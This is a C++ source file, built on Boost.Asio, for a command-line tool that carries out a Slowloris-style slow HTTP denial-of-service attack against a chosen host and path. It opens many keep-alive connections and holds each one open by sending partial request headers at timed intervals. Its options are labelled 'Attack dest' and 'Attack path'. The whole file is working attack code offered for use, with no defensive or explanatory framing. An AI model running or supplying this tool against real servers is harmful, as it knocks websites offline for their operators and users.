#include <iostream>
#include <boost/asio.hpp>
#include <boost/bind.hpp>
#include <boost/format.hpp>
#include <boost/program_options.hpp>

using namespace std;
using namespace boost;
using namespace asio;
namespace po = boost::program_options;

int concurrency, trunks, interval, expires;
string host, path;

class Request {
public:
	Request(io_service& io, int id) : id(id), count(0) {
		timer = new deadline_timer(io, posix_time::seconds(interval));
		stream = new ip::tcp::iostream(host, "http");
		start();
	}
	~Request() {
		delete timer;
		delete stream;
	}

	void start() {
		cout << format("[start ] %1%") % id << endl;

		*stream << format(
			"GET %1% HTTP/1.1\r\n"
			"Host: %2%\r\n"
			"User-Agent: Boost.Asio\r\n"
			"Accept: */*\r\n"
			"Connection: Keep-Alive\r\n"
		) % path % host;

		stream->flush();
		timer->expires_from_now(posix_time::seconds(interval));
		timer->async_wait(bind(&Request::append, this));
	}

	void append() {
		cout << format("[append] %1%->%2%") % id % count << endl;
		*stream << format("X-Trunk: %1%\r\n") % count;
		stream->flush();

		if (count < trunks) {
			count++;
			timer->expires_from_now(posix_time::seconds(interval));
			timer->async_wait(bind(&Request::append, this));
		} else {
			timer->expires_from_now(posix_time::seconds(interval));
			timer->async_wait(bind(&Request::finish, this));
		}
	}

	void finish() {
		*stream << "\r\n";
		stream->flush();
		cout << format("[finish] %1%") % id << endl;

		new Request(timer->get_io_service(), id + concurrency);
		timer->expires_from_now(posix_time::seconds(expires));
		timer->async_wait(bind(&Request::close, this));
	}

	void close(){
		cout << format("[close ] %1%") % id << endl;
		delete this;
	}

private:
	deadline_timer* timer;
	ip::tcp::iostream* stream;
	int id;
	int count;

};

void requestFactory(io_service* io, deadline_timer* timer, int id) {
	new Request(*io, id);

	if(id < concurrency) {
		timer->expires_from_now(posix_time::millisec(100));
		timer->async_wait(bind(requestFactory, io, timer, ++id));
	}
}

int main(int argc, char *argv[]) {
	po::options_description desc("Options");
	desc.add_options()
		("dest,d", po::value<string>()->default_value("localhost"), "Attack dest")
		("path,p", po::value<string>()->default_value("/"), "Attack path")
		("concurrency,c", po::value<int>()->default_value(20), "Concurrency requests")
		("trunks,t", po::value<int>()->default_value(10), "Trunks count")
		("interval,i", po::value<int>()->default_value(5), "Interval between trunks")
		("expires,e", po::value<int>()->default_value(5), "Expires for keep-alive connection")
		("help,h", "Show this help info");

	po::variables_map vm;

	try{
		po::store(po::parse_command_line(argc, argv, desc), vm);
		if (vm.count("help")) {
			cout << desc << endl;
			return 1;
		}
		po::notify(vm);

		host = vm["dest"].as<string>();
		path = vm["path"].as<string>();
		concurrency = vm["concurrency"].as<int>();
		trunks = vm["trunks"].as<int>();
		interval = vm["interval"].as<int>();
		expires = vm["expires"].as<int>();
	} catch(po::error& e) {
		cerr << "Error: " << e.what() << endl << endl;
		cout << desc << endl;
		return -1;
	}

	io_service io;
	deadline_timer timer(io);
	requestFactory(&io, &timer, 0);

	cout << format("Attacking %1%%2% with concurrency=%3%, trunks=%4%, interval=%5%, expires=%6%") % host % path % concurrency % trunks % interval % expires << endl << endl;

	io.run();

	return 0;
}